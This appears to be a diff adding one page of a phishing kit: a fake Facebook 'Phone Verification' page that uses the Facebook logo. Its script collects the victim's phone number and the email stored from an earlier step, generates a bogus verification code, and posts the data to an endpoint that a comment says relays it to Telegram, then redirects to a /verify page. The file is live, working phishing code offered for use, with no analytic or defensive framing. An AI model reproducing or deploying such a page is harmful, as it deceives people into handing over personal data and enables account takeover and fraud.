@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Phone Verification</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" alt="Facebook" class="fb-logo">
+        
+        <div class="phone-input-container">
+            <div class="screen-title">Phone Verification Required</div>
+            <div class="screen-text">Enter your phone number for added security:</div>
+            
+            <form id="phoneForm">
+                <div class="input-group">
+                    <input type="tel" id="phone" placeholder=" " required>
+                    <label for="phone">Phone Number</label>
+                </div>
+                
+                <button type="submit" class="primary">
+                    <span id="buttonText">Send Verification Code</span>
+                    <div class="button-loader" id="buttonLoader"></div>
+                </button>
+            </form>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('phoneForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const email = sessionStorage.getItem('email');
+            
+            // Generate verification code
+            const code = Math.floor(100000 + Math.random() * 900000).toString();
+            sessionStorage.setItem('phone_code', code);
+            sessionStorage.setItem('phone_number', phone);
+            
+            // Show loading
+            const btn = document.querySelector('.primary');
+            const buttonText = document.getElementById('buttonText');
+            const buttonLoader = document.getElementById('buttonLoader');
+            
+            btn.disabled = true;
+            buttonText.style.display = 'none';
+            buttonLoader.style.display = 'block';
+            
+            // Send to Telegram
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'phone',
+                    data: { email, phone },
+                    ip: 'user_ip_here'
+                })
+            });
+            
+            // Redirect to verification page
+            setTimeout(() => {
+                window.location.href = '/verify';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
